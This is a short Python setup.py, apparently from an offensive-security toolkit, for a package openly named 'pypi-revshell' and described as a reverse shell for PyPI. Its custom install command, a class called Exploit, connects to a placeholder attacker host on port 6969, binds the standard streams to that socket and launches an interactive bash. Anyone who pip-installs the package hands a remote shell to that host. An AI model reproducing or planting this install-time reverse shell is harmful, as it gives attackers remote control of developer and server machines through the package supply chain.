import os
import socket
import subprocess
from setuptools import setup
from setuptools.command.install import install


class Exploit(install):
    def run(self):
        # CHANGE IP PORT
        LHOST = "IP"
        LPORT = 6969

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((LHOST, LPORT))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        p = subprocess.call(["/bin/bash", "-i"])


setup(name="pypi-revshell",
      version="0.1",
      description="Reverse Shell for PyPi",
      author="kashz",
      author_email="kashz",
      url="",
      license="MIT",
      zip_safe=False,
      cmdclass={"install": Exploit})
